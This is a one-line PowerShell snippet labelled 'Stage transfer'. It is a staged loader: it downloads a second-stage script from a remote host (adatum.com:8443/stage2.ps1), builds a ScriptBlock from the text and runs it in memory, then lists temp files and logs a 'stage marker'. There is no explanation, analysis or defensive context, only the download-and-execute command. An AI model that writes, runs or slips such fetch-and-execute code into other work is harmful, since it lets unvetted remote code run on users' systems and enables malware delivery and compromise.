
<# Stage transfer #> $PayloadText = (iwr "https://adatum.com:8443/stage2.ps1" -UseBasicParsing).Content; [ScriptBlock]::Create($PayloadText).Invoke(); Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3; Write-Verbose "stage marker 21 reached"
